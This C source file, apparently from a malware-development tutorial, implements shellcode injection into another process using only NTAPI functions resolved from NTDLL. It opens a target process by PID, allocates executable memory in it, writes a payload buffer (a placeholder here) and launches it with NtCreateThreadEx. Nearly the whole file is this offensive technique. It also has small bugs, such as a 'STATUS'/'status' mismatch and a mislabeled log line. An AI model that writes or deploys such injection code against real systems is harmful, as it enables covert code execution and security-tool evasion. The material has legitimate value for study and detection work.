/*----------------------------------------------------------------------------------------------------------
@author     crow
@brief      use only NTAPI for a standard shellcode injection
@site       https://www.crow.rip/crows-nest/mal/dev/inject/ntapi-injection/complete-ntapi-implementation
----------------------------------------------------------------------------------------------------------*/

#include "glassBox.h"

/*-----------[GETMOD]-----------*/
HMODULE getMod(IN LPCWSTR modName) {

    HMODULE hModule = NULL;

    info("trying to get a handle to %S", modName);
    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        warn("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        okay("got a handle to the module!");
        info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }

}

int main(int argc, char* argv[]) {
    
    DWORD             PID          = 0;
    NTSTATUS          STATUS       = 0;
    PVOID             rBuffer      = NULL;
    HANDLE            hProcess     = NULL;
    HANDLE            hThread      = NULL;
    HMODULE           hNTDLL       = NULL;

    unsigned char     crowPuke[]   = "\xDE\xAD\xBE\xEF";
    size_t            crowPukeSize = sizeof(crowPuke);
    size_t            bytesWritten = 0;

    if (argc < 2) {
        warn("usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);

    OBJECT_ATTRIBUTES OA           = { sizeof(OA), NULL };
    CLIENT_ID         CID          = { (HANDLE)PID, NULL };

    hNTDLL = getMod(L"NTDLL");
    if (hNTDLL == NULL) {
        warn("unable to get a handle to NTDLL, error: 0x%lx", GetLastError());
        goto CLEANUP;
    }

    /*-----------[FUNC PROTOTYPES]-----------*/
    info("populating function prototypes");
    NtOpenProcess kawOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    okay("got NtOpenProcess!");
    info("\\___[ NtOpenProcess\n\t| kawCreateThread\n\t|_0x%p]\n", kawOpenProcess);
    NtAllocateVirtualMemory kawAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    okay("got NtWriteVirtualMemory!");
    info("\\___[ NtAllocateVirtualMemory\n\t| kawAllocateVirtualMemory\n\t|_0x%p]\n", kawAllocateVirtualMemory);
    NtWriteVirtualMemory kawWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    okay("got NtWriteVirtualMemory!");
    info("\\___[ NtWriteVirtualMemory\n\t| kawWriteVirtualMemory\n\t|_0x%p]\n", kawWriteVirtualMemory);
    NtCreateThreadEx kawCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    okay("got NtCreateThreadEx!");
    info("\\___[ NtCreateThreadEx\n\t| kawCreateThreadEx\n\t|_0x%p]\n", kawCreateThreadEx);
    okay("all function prototypes filled!");

    /*-----------[INJECTION]-----------*/
    info("getting a handle to the process (%ld)", PID);
    status = kawOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (status != STATUS_SUCCESS) {
        warn("failed to get a handle to the process, error: 0x%x", status);
        return EXIT_FAILURE;
    }
    okay("got a handle to the process!");
    info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

    status = kawAllocateVirtualMemory(hProcess, &rBuffer, NULL, &crowPukeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        warn("failed allocate buffer in process memory, error: 0x%x", status);
        goto CLEANUP;
    }
    okay("allocated a region of %zu-bytes with PAGE_EXECUTE_READWRITE permissions", crowPukeSize);

    status = kawWriteVirtualMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), &bytesWritten);
    if (status != STATUS_SUCCESS) {
        warn("failed to write to allocated buffer, error: 0x%x", status);
        goto CLEANUP;
    }
    okay("wrote %zu-bytes to allocated buffer", bytesWritten);

    status = kawCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        warn("failed to create new thread, error: 0x%x", status);
        goto CLEANUP;
    }
    okay("got a handle to the thread!");
    info("\\___[ hThread\n\t\\_0x%p]\n", hThread);

    info("waiting for thread to finish...");
    WaitForSingleObject(hThread, INFINITE);
    okay("thread finished execution!");

    info("cleaning up now");
    goto CLEANUP;

CLEANUP:

    if (hThread) {
        info("closing handle to thread");
        CloseHandle(hThread);
    }
    if (hProcess) {
        info("closing handle to process");
        CloseHandle(hProcess);
    }

    okay("finished with the cleanup, exiting now. goodbye :>");
    return EXIT_SUCCESS;

}
